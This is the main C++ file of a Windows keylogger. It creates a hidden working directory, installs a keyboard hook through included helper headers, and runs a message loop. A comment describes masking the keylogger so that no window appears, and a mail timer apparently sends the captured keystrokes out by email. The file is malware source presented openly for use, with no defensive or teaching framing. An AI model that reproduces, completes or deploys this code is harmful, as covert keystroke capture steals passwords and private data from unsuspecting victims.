#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
    MSG msg;
    IO::MkDir(IO::GetOurPath(true));//It will create the path

    InstallHook();

    while(GetMessage (&msg , NULL, 0, 0)){

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    /* Masking the key logger so there is no screen showing up */

    MailTimer.Stop();
    return 0;
}
